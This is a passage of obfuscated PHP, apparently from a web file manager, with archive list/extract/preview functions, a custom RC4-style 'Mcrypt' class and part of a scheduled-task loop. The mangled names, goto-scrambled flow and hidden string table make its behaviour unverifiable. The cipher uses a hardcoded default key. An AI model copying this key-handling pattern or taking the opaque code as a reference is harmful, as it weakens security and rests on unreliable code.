$BÀî‡ŞÅ[1805])); goto B†¹ÏŞ¯; fŞï·¥‹: } static function listContent($D¯İ×ãŸ¢‹, $dÎèâÔç¯à = true) { $a˜¶æœÜÒ³ =& $_SERVER[‘®…¢À]; self::init(); $A„•¯Âé = !empty($GLOBALS[$a˜¶æœÜÒ³[1007]]) ? $GLOBALS[$a˜¶æœÜÒ³[1007]] : get_path_ext($D¯İ×ãŸ¢‹); $f‡ñ‹‡ß¯ì = !1; if (self::checkIfType($A„•¯Âé, $a˜¶æœÜÒ³[1798])) { $BØ‚ö•İÅ = PclTarList($D¯İ×ãŸ¢‹, $A„•¯Âé); $f‡ñ‹‡ß¯ì = array(); for ($dÄÃŞ¡å’Ì = 0; $dÄÃŞ¡å’Ì < count($BØ‚ö•İÅ); $dÄÃŞ¡å’Ì++) { $AŠ“á´àÉ‹ = $BØ‚ö•İÅ[$dÄÃŞ¡å’Ì]; if ($AŠ“á´àÉ‹[$a˜¶æœÜÒ³[1813]] == $a˜¶æœÜÒ³[1814] || $AŠ“á´àÉ‹[$a˜¶æœÜÒ³[1813]] == $a˜¶æœÜÒ³[1815]) { continue; } if ($dÎèâÔç¯à) { $AŠ“á´àÉ‹[$a˜¶æœÜÒ³[1816]] = ltrim($AŠ“á´àÉ‹[$a˜¶æœÜÒ³[1816]], $a˜¶æœÜÒ³[1105]); } if ($AŠ“á´àÉ‹[$a˜¶æœÜÒ³[1813]] == $a˜¶æœÜÒ³[1817]) { $AŠ“á´àÉ‹[$a˜¶æœÜÒ³[77]] = !0; } else { $AŠ“á´àÉ‹[$a˜¶æœÜÒ³[77]] = !1; } $AŠ“á´àÉ‹[$a˜¶æœÜÒ³[994]] = $dÄÃŞ¡å’Ì; $f‡ñ‹‡ß¯ì[] = $AŠ“á´àÉ‹; } } else { if (self::checkIfType($A„•¯Âé, $a˜¶æœÜÒ³[1003])) { $c–·ÈƒÙĞì = kodRarArchive::listContent($D¯İ×ãŸ¢‹); if (!$c–·ÈƒÙĞì[$a˜¶æœÜÒ³[990]]) { return $c–·ÈƒÙĞì; } else { $f‡ñ‹‡ß¯ì = $c–·ÈƒÙĞì[$a˜¶æœÜÒ³[992]]; } } else { if (kodZipArchive::support($a˜¶æœÜÒ³[350])) { $f‡ñ‹‡ß¯ì = kodZipArchive::listContent($D¯İ×ãŸ¢‹); } else { $D‚Ëğ›ğ‘Ë = new PclZip($D¯İ×ãŸ¢‹); $f‡ñ‹‡ß¯ì = $D‚Ëğ›ğ‘Ë->listContent(); } } } if ($f‡ñ‹‡ß¯ì) { $D¡‘Ì™­Ë² = unzip_charset_get($f‡ñ‹‡ß¯ì); $dÎèâÔç¯à = $dÎèâÔç¯à && function_exists($a˜¶æœÜÒ³[66]); for ($dÄÃŞ¡å’Ì = 0; $dÄÃŞ¡å’Ì < count($f‡ñ‹‡ß¯ì); $dÄÃŞ¡å’Ì++) { $f‡ñ‹‡ß¯ì[$dÄÃŞ¡å’Ì][$a˜¶æœÜÒ³[1816]] = str_replace(array($a˜¶æœÜÒ³[1030], $a˜¶æœÜÒ³[1818]), $a˜¶æœÜÒ³[744], $f‡ñ‹‡ß¯ì[$dÄÃŞ¡å’Ì][$a˜¶æœÜÒ³[1816]]); if ($dÎèâÔç¯à) { $f‡ñ‹‡ß¯ì[$dÄÃŞ¡å’Ì][$a˜¶æœÜÒ³[1816]] = iconv_to($f‡ñ‹‡ß¯ì[$dÄÃŞ¡å’Ì][$a˜¶æœÜÒ³[1816]], $D¡‘Ì™­Ë², $a˜¶æœÜÒ³[323]); unset($f‡ñ‹‡ß¯ì[$dÄÃŞ¡å’Ì][$a˜¶æœÜÒ³[1819]]); } } return array($a˜¶æœÜÒ³[990] => !0, $a˜¶æœÜÒ³[992] => $f‡ñ‹‡ß¯ì); } else { return array($a˜¶æœÜÒ³[990] => !1, $a˜¶æœÜÒ³[992] => $f‡ñ‹‡ß¯ì); } } static function extract($c–ä›åÀÆ‡, $AµäËºâÅÚ, $eÕ„¯—›ÒÖ = "\55\x31", &$cê¹İ»Ôº¿ = false) { goto A¹ùÉ³õÜ; A¹ùÉ³õÜ: $c „¥¡·é =& $_SERVER[‘®…¢À]; self::init(); $Cç¯¬ŠÏ™Ø = !empty($GLOBALS[$c „¥¡·é[1007]]) ? $GLOBALS[$c „¥¡·é[1007]] : get_path_ext($c–ä›åÀÆ‡); goto BìÆÍ¿åŸ; AØó•µ×“º: if (self::checkIfType($Cç¯¬ŠÏ™Ø, $c „¥¡·é[1798])) { if ($eÕ„¯—›ÒÖ != $c „¥¡·é[989]) { $E¤Œóª–”ç = unzip_pre_name($E¤Œóª–”ç); $FÏ¸ÃÖÄ®Ï = unzip_pre_name($FÏ¸ÃÖÄ®Ï); $e®¥½ÖİÅ = PclTarExtractList($c–ä›åÀÆ‡, array($E¤Œóª–”ç), $AµäËºâÅÚ, $FÏ¸ÃÖÄ®Ï, $Cç¯¬ŠÏ™Ø); } else { $e®¥½ÖİÅ = PclTarExtract($c–ä›åÀÆ‡, $AµäËºâÅÚ, $c „¥¡·é[357], $Cç¯¬ŠÏ™Ø); } return array($c „¥¡·é[990] => $e®¥½ÖİÅ, $c „¥¡·é[992] => PclErrorString(!0)); } else { if (self::checkIfType($Cç¯¬ŠÏ™Ø, $c „¥¡·é[1003])) { return kodRarArchive::extract($c–ä›åÀÆ‡, $AµäËºâÅÚ, $Cç¯¬ŠÏ™Ø, $cê¹İ»Ôº¿); } else { if (kodZipArchive::support($c „¥¡·é[1820])) { return kodZipArchive::extract($c–ä›åÀÆ‡, $AµäËºâÅÚ, $cê¹İ»Ôº¿); } else { $A„¼Ó†Ğ« = new PclZip($c–ä›åÀÆ‡); if ($eÕ„¯—›ÒÖ != $c „¥¡·é[989]) { $e®¥½ÖİÅ = $A„¼Ó†Ğ«->extract(PCLZIP_OPT_PATH, $AµäËºâÅÚ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $c „¥¡·é[1821], PCLZIP_OPT_BY_NAME, $DÔÓê„Ñ‘Ì[$c „¥¡·é[1816]], PCLZIP_OPT_REMOVE_PATH, $FÏ¸ÃÖÄ®Ï, PCLZIP_OPT_REPLACE_NEWER); } else { $e®¥½ÖİÅ = $A„¼Ó†Ğ«->extract(PCLZIP_OPT_PATH, $AµäËºâÅÚ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $c „¥¡·é[1821], PCLZIP_OPT_REPLACE_NEWER); } return array($c „¥¡·é[990] => $e®¥½ÖİÅ, $c „¥¡·é[992] => $A„¼Ó†Ğ«->errorName(!0)); } } } return array($c „¥¡·é[990] => !1, $c „¥¡·é[992] => $c „¥¡·é[1822]); goto EÖ«âàßóÄ; BìÆÍ¿åŸ: $f“Ä‰±©àˆ = self::listContent($c–ä›åÀÆ‡, !1); if (!$f“Ä‰±©àˆ[$c „¥¡·é[990]]) { return $f“Ä‰±©àˆ; } if ($eÕ„¯—›ÒÖ != $c „¥¡·é[989]) { goto BãĞ§èîÇ; BãĞ§èîÇ: $DÔÓê„Ñ‘Ì = self::fileIndex($f“Ä‰±©àˆ[$c „¥¡·é[992]], $eÕ„¯—›ÒÖ); $cê¹İ»Ôº¿ = str_replace(array($c „¥¡·é[1030], $c „¥¡·é[1818]), $c „¥¡·é[71], $DÔÓê„Ñ‘Ì[$c „¥¡·é[1816]]); $E¤Œóª–”ç = $cê¹İ»Ôº¿; goto B¦¦ğ’÷¯; aÃ…´÷Ë˜Ì: if ($DÔÓê„Ñ‘Ì[$c „¥¡·é[77]]) { $E¤Œóª–”ç = rtrim($E¤Œóª–”ç, $c „¥¡·é[8]) . $c „¥¡·é[8]; $cê¹İ»Ôº¿ = array($cê¹İ»Ôº¿); } $a•ê„«İîç = str_replace($c „¥¡·é[96], $c „¥¡·é[8], $E¤Œóª–”ç); if (substr($a•ê„«İîç, -1) == $c „¥¡·é[8]) { if (!strstr(trim($a•ê„«İîç, $c „¥¡·é[8]), $c „¥¡·é[8])) { $AµäËºâÅÚ = $AµäËºâÅÚ . get_path_this($a•ê„«İîç) . $c „¥¡·é[8]; } } else { if ($FÏ¸ÃÖÄ®Ï == $E¤Œóª–”ç) { $FÏ¸ÃÖÄ®Ï = $c „¥¡·é[33]; } } goto E¯ØæìõÇä; B¦¦ğ’÷¯: if ($GLOBALS[$c „¥¡·é[6]][$c „¥¡·é[1103]] != $c „¥¡·é[323]) { $E¤Œóª–”ç = unzip_pre_name($cê¹İ»Ôº¿); } $FÏ¸ÃÖÄ®Ï = get_path_father($cê¹İ»Ôº¿); if ($FÏ¸ÃÖÄ®Ï == $cê¹İ»Ôº¿) { $FÏ¸ÃÖÄ®Ï = $c „¥¡·é[33]; } goto aÃ…´÷Ë˜Ì; E¯ØæìõÇä: } goto AØó•µ×“º; EÖ«âàßóÄ: } static function fileIndex($fµÊÓÕîƒ³, $aõçİÀçäÓ, $aš¼‚©ï…ñ = false) { goto AİÀÔ’àç; A© ·È: $aßÍ…‹Ê§â = count($fµÊÓÕîƒ³); for ($EÒ£…š“—Ÿ = 0; $EÒ£…š“—Ÿ < $aßÍ…‹Ê§â; $EÒ£…š“—Ÿ++) { if ($aõçİÀçäÓ == $fµÊÓÕîƒ³[$EÒ£…š“—Ÿ][$AÀ¾¥Í»ìÈ[994]]) { $E³„Ï¼±œ± = $fµÊÓÕîƒ³[$EÒ£…š“—Ÿ]; break; } } if (!$E³„Ï¼±œ±) { show_tips($AÀ¾¥Í»ìÈ[1823]); } goto D¤Œ‹ÕƒÇ¹; D¤Œ‹ÕƒÇ¹: $EìÃïÁâİ = $E³„Ï¼±œ±; if ($aš¼‚©ï…ñ) { $EìÃïÁâİ = $E³„Ï¼±œ±[$aš¼‚©ï…ñ]; if ($E³„Ï¼±œ±[$AÀ¾¥Í»ìÈ[77]]) { $EìÃïÁâİ = rtrim($EìÃïÁâİ, $AÀ¾¥Í»ìÈ[8]) . $AÀ¾¥Í»ìÈ[8]; } } return $EìÃïÁâİ; goto D¢•¹˜Î; AİÀÔ’àç: $AÀ¾¥Í»ìÈ =& $_SERVER[‘®…¢À]; self::init(); if (!is_array($fµÊÓÕîƒ³)) { return !1; } goto A© ·È; D¢•¹˜Î: } static function extractZipFile($AçŠåŸè¶ò, $CØğª¹ƒ‹®, $c­¤Ô¶‘Æ = false) { goto CõÛìÛé‡œ; D™¿õó ñˆ: if (file_exists($E˜ŞòÔÙáÚ)) { return $E˜ŞòÔÙáÚ; } $a¸´¶òÊˆİ = new PclZip($AçŠåŸè¶ò); $d¹Ïœ•‚…â = unzip_filter_ext($Dİ¥”ªøÌ . get_path_this($CØğª¹ƒ‹®)); goto cÍ«Ô‹‘Áø; CõÛìÛé‡œ: $f Î¾¿ÓÒ =& $_SERVER[‘®…¢À]; self::init(); $Dİ¥”ªøÌ = TEMP_FILES . hash_path($AçŠåŸè¶ò) . $f Î¾¿ÓÒ[8]; goto fÛ‡¡ñá´Ë; eòÕ¬‹ö»: if (!file_exists($d¹Ïœ•‚…â)) { return !1; } @rename($d¹Ïœ•‚…â, $E˜ŞòÔÙáÚ); return $E˜ŞòÔÙáÚ; goto eî¤ô§¹È; cÍ«Ô‹‘Áø: $CàÉ‹¹¸§ø = get_path_father($CØğª¹ƒ‹®); if ($CàÉ‹¹¸§ø == $CØğª¹ƒ‹®) { $CàÉ‹¹¸§ø = $f Î¾¿ÓÒ[33]; } $Cš’Ùˆ = $a¸´¶òÊˆİ->extract(PCLZIP_OPT_PATH, $Dİ¥”ªøÌ, PCLZIP_CB_PRE_FILE_NAME, $f Î¾¿ÓÒ[1821], PCLZIP_OPT_REMOVE_PATH, $CàÉ‹¹¸§ø, PCLZIP_OPT_BY_NAME, $CØğª¹ƒ‹®); goto eòÕ¬‹ö»; fÛ‡¡ñá´Ë: mk_dir($Dİ¥”ªøÌ); $E˜ŞòÔÙáÚ = $Dİ¥”ªøÌ . md5($AçŠåŸè¶ò . $CØğª¹ƒ‹®); if ($c­¤Ô¶‘Æ) { $E˜ŞòÔÙáÚ = $Dİ¥”ªøÌ . $c­¤Ô¶‘Æ; } goto D™¿õó ñˆ; eî¤ô§¹È: } static function filePreview($CÎ¨ âëÂ½, $E›ã§È”‡®, $eÖŸ§°É±© = false, $bàÃõ”áİ = false) { goto E”°÷ø“ŞŒ; Aí—àäªœ«: mk_dir($D•Åä×…Šˆ); $a¹ö¨ßíˆÂ = $D•Åä×…Šˆ . md5($CÎ¨ âëÂ½ . $E›ã§È”‡® . $bàÃõ”áİ); $cÅƒ¯ß“ = $E—óÍô“ÂŞ[33]; goto d¯É¥ÓˆÂ; E”°÷ø“ŞŒ: $E—óÍô“ÂŞ =& $_SERVER[‘®…¢À]; self::init(); $D•Åä×…Šˆ = TEMP_FILES . hash_path($CÎ¨ âëÂ½) . $E—óÍô“ÂŞ[8]; goto Aí—àäªœ«; eç¡Ğ°‚™: $cÅƒ¯ß“ = unzip_pre_name($cÅƒ¯ß“); $dÛ¤¾“¿½ = get_path_this($cÅƒ¯ß“); $c±°…¯•Œ± = unzip_filter_ext($D•Åä×…Šˆ . $dÛ¤¾“¿½); goto A”¦ä‹Ÿñ; A”¦ä‹Ÿñ: if (!$F‚¯ÇïÕÎ[$E—óÍô“ÂŞ[990]]) { show_json($F‚¯ÇïÕÎ[$E—óÍô“ÂŞ[992]], !1); } if (!file_exists($c±°…¯•Œ±)) { show_json($E—óÍô“ÂŞ[1825], !1); } @rename($c±°…¯•Œ±, $a¹ö¨ßíˆÂ); goto DÖøÙ‡ò; DÖøÙ‡ò: if (!file_exists($a¹ö¨ßíˆÂ)) { del_dir($D•Åä×…Šˆ); show_json($E—óÍô“ÂŞ[1826]); } IO::fileOut($a¹ö¨ßíˆÂ, $eÖŸ§°É±©, $dÛ¤¾“¿½); goto D™ôŸˆÑÁ; d¯É¥ÓˆÂ: $F‚¯ÇïÕÎ = self::extract($CÎ¨ âëÂ½, $D•Åä×…Šˆ, $E›ã§È”‡®, $cÅƒ¯ß“); if (is_array($cÅƒ¯ß“)) { show_json($E—óÍô“ÂŞ[1824], !1); } if (file_exists($a¹ö¨ßíˆÂ)) { IO::fileOut($a¹ö¨ßíˆÂ, $eÖŸ§°É±©, get_path_this($cÅƒ¯ß“)); return; } goto eç¡Ğ°‚™; D™ôŸˆÑÁ: } static function create($c’ŸÀ”›Íé, $EÏ¶Ä«£¬à) { $e£†Ş­„ò =& $_SERVER[‘®…¢À]; self::init(); $B³ó³ø‚ä£ = get_path_ext($c’ŸÀ”›Íé); $dŒ˜õĞùˆ = !1; if (self::checkIfType($B³ó³ø‚ä£, $e£†Ş­„ò[298])) { if (kodZipArchive::support($e£†Ş­„ò[967])) { return kodZipArchive::create($c’ŸÀ”›Íé, $EÏ¶Ä«£¬à); } $C’¹¦•ŞÈ = new PclZip($c’ŸÀ”›Íé); foreach ($EÏ¶Ä«£¬à as $d„ˆÙñŒ => $EÙğ‡åÑÔƒ) { $EÙğ‡åÑÔƒ = str_replace($e£†Ş­„ò[462], $e£†Ş­„ò[8], $EÙğ‡åÑÔƒ); $B÷©…¬±›½ = Kodio::clear(get_path_father($EÙğ‡åÑÔƒ)); if ($d„ˆÙñŒ == 0) { $dŒ˜õĞùˆ = $C’¹¦•ŞÈ->create($EÙğ‡åÑÔƒ, PCLZIP_OPT_REMOVE_PATH, $B÷©…¬±›½, PCLZIP_CB_PRE_FILE_NAME, $e£†Ş­„ò[1827]); continue; } $dŒ˜õĞùˆ = $C’¹¦•ŞÈ->add($EÙğ‡åÑÔƒ, PCLZIP_OPT_REMOVE_PATH, $B÷©…¬±›½, PCLZIP_CB_PRE_FILE_NAME, $e£†Ş­„ò[1827]); } } else { if (self::checkIfType($B³ó³ø‚ä£, $e£†Ş­„ò[1798])) { foreach ($EÏ¶Ä«£¬à as $d„ˆÙñŒ => $EÙğ‡åÑÔƒ) { $EÙğ‡åÑÔƒ = str_replace($e£†Ş­„ò[462], $e£†Ş­„ò[8], $EÙğ‡åÑÔƒ); $B÷©…¬±›½ = Kodio::clear(get_path_father($EÙğ‡åÑÔƒ)); if ($d„ˆÙñŒ == 0) { $dŒ˜õĞùˆ = PclTarCreate($c’ŸÀ”›Íé, array($EÙğ‡åÑÔƒ), $B³ó³ø‚ä£, null, $B÷©…¬±›½); continue; } $dŒ˜õĞùˆ = PclTarAddList($c’ŸÀ”›Íé, array($EÙğ‡åÑÔƒ), $e£†Ş­„ò[33], $B÷©…¬±›½, $B³ó³ø‚ä£); } } } return $dŒ˜õĞùˆ; } } class Mcrypt { public static $defaultKey = "\141\x21\x74\x61\153\x41\72\x64\x6c\x6d\143\154\x64\x45\x76\x2c\x65"; public static function encode($f¹òßâİ˜Ê, $cÙ¡‚°ÕÑ­ = '', $cˆ™„Û™™ = 0, $b§Ú§£Ï¹ = '') { goto A­³¤‹ÁĞ“; bï›ó»Â‰Ï: for ($dÂÁ‘¢Œ§Ë = 0; $dÂÁ‘¢Œ§Ë <= 255; $dÂÁ‘¢Œ§Ë++) { $f”º”—é˜à[$dÂÁ‘¢Œ§Ë] = ord($aìàÌ°ã½È[$dÂÁ‘¢Œ§Ë % $A³çÜ±°°]); } $b¶¡ İŸ•¦ = range(0, 255); for ($fğ¡’ôß×À = $dÂÁ‘¢Œ§Ë = 0; $dÂÁ‘¢Œ§Ë < 256; $dÂÁ‘¢Œ§Ë++) { $fğ¡’ôß×À = ($fğ¡’ôß×À + $b¶¡ İŸ•¦[$dÂÁ‘¢Œ§Ë] + $f”º”—é˜à[$dÂÁ‘¢Œ§Ë]) % 256; $DœàÍ×µøÈ = $b¶¡ İŸ•¦[$dÂÁ‘¢Œ§Ë]; $b¶¡ İŸ•¦[$dÂÁ‘¢Œ§Ë] = $b¶¡ İŸ•¦[$fğ¡’ôß×À]; $b¶¡ İŸ•¦[$fğ¡’ôß×À] = $DœàÍ×µøÈ; } goto fŒªåª‰; c’ÈÎâ¦õæ: $d©ŒÚè™× = str_replace(array($Cà‘´”ĞªÛ[281], $Cà‘´”ĞªÛ[8], $Cà‘´”ĞªÛ[888]), array($Cà‘´”ĞªÛ[407], $Cà‘´”ĞªÛ[71], $Cà‘´”ĞªÛ[94]), $d©ŒÚè™×); return $d©ŒÚè™×; goto cª…¹Ä³; fŒªåª‰: $d©ŒÚè™× = $Cà‘´”ĞªÛ[33]; for ($dÛäÚ« = $fğ¡’ôß×À = $dÂÁ‘¢Œ§Ë = 0; $dÂÁ‘¢Œ§Ë < $f¯ñæµŸ‚Ã; $dÂÁ‘¢Œ§Ë++) { $dÛäÚ« = ($dÛäÚ« + 1) % 256; $fğ¡’ôß×À = ($fğ¡’ôß×À + $b¶¡ İŸ•¦[$dÛäÚ«]) % 256; $DœàÍ×µøÈ = $b¶¡ İŸ•¦[$dÛäÚ«]; $b¶¡ İŸ•¦[$dÛäÚ«] = $b¶¡ İŸ•¦[$fğ¡’ôß×À]; $b¶¡ İŸ•¦[$fğ¡’ôß×À] = $DœàÍ×µøÈ; $d©ŒÚè™× .= chr(ord($f¹òßâİ˜Ê[$dÂÁ‘¢Œ§Ë]) ^ $b¶¡ İŸ•¦[($b¶¡ İŸ•¦[$dÛäÚ«] + $b¶¡ İŸ•¦[$fğ¡’ôß×À]) % 256]); } $d©ŒÚè™× = $e¤Û›¾ãĞ¨ . str_replace($Cà‘´”ĞªÛ[888], $Cà‘´”ĞªÛ[33], base64_encode($d©ŒÚè™×)); goto c’ÈÎâ¦õæ; f¶Õ†‘ßÈœ: $f¹òßâİ˜Ê = sprintf($Cà‘´”ĞªÛ[1828], $cˆ™„Û™™ ? $cˆ™„Û™™ + time() : 0) . substr(md5($f¹òßâİ˜Ê . $a‘±­ÀÄĞÀ), 0, 16) . $f¹òßâİ˜Ê; $f¯ñæµŸ‚Ã = strlen($f¹òßâİ˜Ê); $f”º”—é˜à = array(); goto bï›ó»Â‰Ï; BÄáÃ™”ÙÇ: $e²Õ¿ÖÏŠ = md5(substr($cÙ¡‚°ÕÑ­, 0, 16)); $a‘±­ÀÄĞÀ = md5(substr($cÙ¡‚°ÕÑ­, 16, 16)); $b§Ú§£Ï¹ = $b§Ú§£Ï¹ ? $b§Ú§£Ï¹ : md5(microtime()); goto A…è¶ÎØÕè; A…è¶ÎØÕè: $e¤Û›¾ãĞ¨ = substr($b§Ú§£Ï¹, -$FŸÉÓ°»‡À); $aìàÌ°ã½È = $e²Õ¿ÖÏŠ . md5($e²Õ¿ÖÏŠ . $e¤Û›¾ãĞ¨); $A³çÜ±°° = strlen($aìàÌ°ã½È); goto f¶Õ†‘ßÈœ; A­³¤‹ÁĞ“: $Cà‘´”ĞªÛ =& $_SERVER[‘®…¢À]; $FŸÉÓ°»‡À = 4; $cÙ¡‚°ÕÑ­ = md5($cÙ¡‚°ÕÑ­ ? $cÙ¡‚°ÕÑ­ : self::$defaultKey); goto BÄáÃ™”ÙÇ; cª…¹Ä³: } public static function decode($dæîÉá›†, $EÚÒÒ˜–ºŒ = '') { goto F‡“î¬¹¦; b”é‹—Ã†Ù: $dæîÉá›† = base64_decode(substr($dæîÉá›†, $fÈ†‚èÖŒÁ)); $C¿¸Ñ•ËÃ¢ = strlen($dæîÉá›†); $Dƒ¾¡Ç·¶ = array(); goto BÈº¦¦Ç¿÷; EÔ©½ñÇ‡±: $EÚÒÒ˜–ºŒ = md5($EÚÒÒ˜–ºŒ ? $EÚÒÒ˜–ºŒ : self::$defaultKey); $AšÉÙ¹‘Ğ¼ = md5(substr($EÚÒÒ˜–ºŒ, 0, 16)); $aÕˆäÃ‹î = md5(substr($EÚÒÒ˜–ºŒ, 16, 16)); goto EÄäÛáÒ’; EÄäÛáÒ’: $Dˆ¢œğŠ‡— = substr($dæîÉá›†, 0, $fÈ†‚èÖŒÁ); $CäÔòÎæ½˜ = $AšÉÙ¹‘Ğ¼ . md5($AšÉÙ¹‘Ğ¼ . $Dˆ¢œğŠ‡—); $a¼çŠ×îĞğ = strlen($CäÔòÎæ½˜); goto b”é‹—Ã†Ù; F‡“î¬¹¦: $fÛª›¿•£˜ =& $_SERVER[‘®…¢À]; $dæîÉá›† = str_replace(array($fÛª›¿•£˜[407], $fÛª›¿•£˜[71], $fÛª›¿•£˜[94]), array($fÛª›¿•£˜[281], $fÛª›¿•£˜[8], $fÛª›¿•£˜[888]), $dæîÉá›†); $fÈ†‚èÖŒÁ = 4; goto EÔ©½ñÇ‡±; BÈº¦¦Ç¿÷: for ($dœÇ¾Œõæã = 0; $dœÇ¾Œõæã <= 255; $dœÇ¾Œõæã++) { $Dƒ¾¡Ç·¶[$dœÇ¾Œõæã] = ord($CäÔòÎæ½˜[$dœÇ¾Œõæã % $a¼çŠ×îĞğ]); } $BÚàíèÀó = range(0, 255); for ($B›óˆ‘Ö÷² = $dœÇ¾Œõæã = 0; $dœÇ¾Œõæã < 256; $dœÇ¾Œõæã++) { $B›óˆ‘Ö÷² = ($B›óˆ‘Ö÷² + $BÚàíèÀó[$dœÇ¾Œõæã] + $Dƒ¾¡Ç·¶[$dœÇ¾Œõæã]) % 256; $D¾ÁÇï¢å = $BÚàíèÀó[$dœÇ¾Œõæã]; $BÚàíèÀó[$dœÇ¾Œõæã] = $BÚàíèÀó[$B›óˆ‘Ö÷²]; $BÚàíèÀó[$B›óˆ‘Ö÷²] = $D¾ÁÇï¢å; } goto B¾ä¢…ì¦‘; B¾ä¢…ì¦‘: $AÂŠÛÓ›ß = $fÛª›¿•£˜[33]; for ($c´„Ÿêãî‹ = $B›óˆ‘Ö÷² = $dœÇ¾Œõæã = 0; $dœÇ¾Œõæã < $C¿¸Ñ•ËÃ¢; $dœÇ¾Œõæã++) { $c´„Ÿêãî‹ = ($c´„Ÿêãî‹ + 1) % 256; $B›óˆ‘Ö÷² = ($B›óˆ‘Ö÷² + $BÚàíèÀó[$c´„Ÿêãî‹]) % 256; $D¾ÁÇï¢å = $BÚàíèÀó[$c´„Ÿêãî‹]; $BÚàíèÀó[$c´„Ÿêãî‹] = $BÚàíèÀó[$B›óˆ‘Ö÷²]; $BÚàíèÀó[$B›óˆ‘Ö÷²] = $D¾ÁÇï¢å; $AÂŠÛÓ›ß .= chr(ord($dæîÉá›†[$dœÇ¾Œõæã]) ^ $BÚàíèÀó[($BÚàíèÀó[$c´„Ÿêãî‹] + $BÚàíèÀó[$B›óˆ‘Ö÷²]) % 256]); } if ((substr($AÂŠÛÓ›ß, 0, 10) == 0 || substr($AÂŠÛÓ›ß, 0, 10) - time() > 0) && substr($AÂŠÛÓ›ß, 10, 16) == substr(md5(substr($AÂŠÛÓ›ß, 26) . $aÕˆäÃ‹î), 0, 16)) { return substr($AÂŠÛÓ›ß, 26); } else { return $fÛª›¿•£˜[33]; } goto bã­†Ö¼; bã­†Ö¼: } } goto FÂ§­·µƒ½; D…¶ø™ÀÑ: class AutoTask { public static function start() { goto E¸‡…È¼¦; E¸‡…È¼¦: $f‚›ƒº‰Ìİ =& $_SERVER[‘®…¢À]; if (self::valueGet($f‚›ƒº‰Ìİ[662]) != $f‚›ƒº‰Ìİ[84]) { return; } if (self::valueGet($f‚›ƒº‰Ìİ[1302]) == $f‚›ƒº‰Ìİ[84]) { $fæï¤«¶Ï = self::valueGet($f‚›ƒº‰Ìİ[1303]); if (time() - $fæï¤«¶Ï > 3600 * 2) { self::restart(); } return; } goto D›‡¡»„‘£; D›‡¡»„‘£: http_close(); self::valueSet($f‚›ƒº‰Ìİ[1302], $f‚›ƒº‰Ìİ[84]); Hook::bind($f‚›ƒº‰Ìİ[1304], $f‚›ƒº‰Ìİ[1305]); goto cãŒÓÄì; cãŒÓÄì: while (!0) { self::cacheClear(); if (self::valueGet($f‚›ƒº‰Ìİ[662]) != $f‚›ƒº‰Ìİ[84]) { self::valueSet($f‚›ƒº‰Ìİ[1302], $f‚›ƒº‰Ìİ[463]); self::log($f‚›ƒº‰Ìİ[1306]); die; } self::valueSet($f‚›ƒº‰Ìİ[1302], $f‚›ƒº‰Ìİ[84]); self::valueSet($f‚›ƒº‰Ìİ[1303], time()); self::taskRunAll(); sleep(self::valueGet($f‚›ƒº‰Ìİ[1307])); } goto C›ÁŸ¹¾ëØ; C›ÁŸ¹¾ëØ: } public static function restart() { $f£Ÿ³‚éŒ =& $_SERVER[‘®…¢À]; http_close(); self::valueSet($f£Ÿ³‚éŒ[662], $f£Ÿ³‚éŒ[463]); sleep(self::valueGet($f£Ÿ³‚éŒ[1307]) + 5); self::valueSet($f£Ÿ³‚éŒ[1302], $f£Ÿ³‚éŒ[463]); self::valueSet($f£Ÿ³‚éŒ[662], $f£Ÿ³‚éŒ[84]); } public static function shutdownEvent() { $B”ê®ãŞ‰® =& $_SERVER[‘®…¢À]; self::valueSet($B”ê®ãŞ‰®[1302], $B”ê®ãŞ‰®[463]); self::log($B”ê®ãŞ‰®[1308]); } public static function config($aàËíœÙæó, $EÈ©âçƒöÛ) { $E²äîîÍ =& $_SERVER[‘®…¢À]; $B­ğ­‚±İè = 20; $EÈ©âçƒöÛ = intval($EÈ©âçƒöÛ) <= $B­ğ­‚±İè ? $B­ğ­‚±İè : intval($EÈ©âçƒöÛ); self::valueSet($E²äîîÍ[662], $aàËíœÙæó); self::valueSet($E²äîîÍ[1307], $EÈ©âçƒöÛ); } private static function taskRunAll() { $d‰ŠÇËòØ =& $_SERVER[‘®…¢À]; $cç‘Õ‡ß¸ = Model($d‰ŠÇËòØ[1309])->listData(); $eô•…Ù…æƒ = count($cç‘Õ‡ß¸); for ($B¦¦ù… = 0; $B¦¦ù… < $eô•…Ù…æƒ; $B¦¦ù…++) { $EñÚ¤à®Æ = $cç‘Õ‡ß¸[$B¦¦ù…]; if ($EñÚ¤à®Æ[$d‰ŠÇËòØ[1310]] != $d‰ŠÇËòØ[84]) { continue; } if (!self::taskTimeCheck($EñÚ¤à®Æ)) { continue; } self::taskRun($EñÚ¤à®Æ); } } private static function taskTimeCheck($D‡ç¤Éí) { goto f³ÍÚ×‰¢; f³ÍÚ×‰¢: $BâÕ—ä¢Äì =& $_SERVER[‘®…¢À]; $c™™¯Ã„ƒ = json_decode($D‡ç¤Éí[$BâÕ—ä¢Äì[187]], !0); $CĞÆ×‡Å”ñ = intval($D‡ç¤Éí[$BâÕ—ä¢Äì[1303]]); goto A±¤‚ÃñÖ¬; A±¤‚ÃñÖ¬: $bòøÂ„™’ = strtotime($BâÕ—ä¢Äì[1311] . $c™™¯Ã„ƒ[$BâÕ—ä¢Äì[1312]] . $BâÕ—ä¢Äì[1313]) - strtotime($BâÕ—ä¢Äì[1314]); $e¾…„íğËÄ = time() - strtotime(date($BâÕ—ä¢Äì[1315]) . $BâÕ—ä¢Äì[1316]); $e”ˆªğ¸ø‹ = $e¾…„íğËÄ >= $bòøÂ„™’ && $e¾…„íğËÄ <= $bòøÂ„™’ + 3600; goto cìØ¨Ä´ª; cìØ¨Ä´ª: switch ($c™™¯Ã„ƒ[$BâÕ—ä¢Äì[29]]) { case $BâÕ—ä¢Äì[1317]: if (time() - $CĞÆ×‡Å”ñ < 3600 * 24 * 30) { return !1; } if ($c™™¯Ã„ƒ[$BâÕ—ä¢Äì[1317]] == date($BâÕ—ä¢Äì[1318]) && $e”ˆªğ¸ø‹) { return !0; } break; case $BâÕ—ä¢Äì[1319]: if (time() - $CĞÆ×‡Å”ñ < 3600 * 24 * 7) { return !1; } $a‰ÂÄìÎ† = date($BâÕ—ä¢Äì[1320]) == 0 ? 7 : date($BâÕ—ä¢Äì[1320]); if ($c™™¯Ã„ƒ[$BâÕ—ä¢Äì[1319]] == $a‰ÂÄìÎ† && $e”ˆªğ¸ø‹) { return !0; } break; case $BâÕ—ä¢Äì[1312]: if (time() - 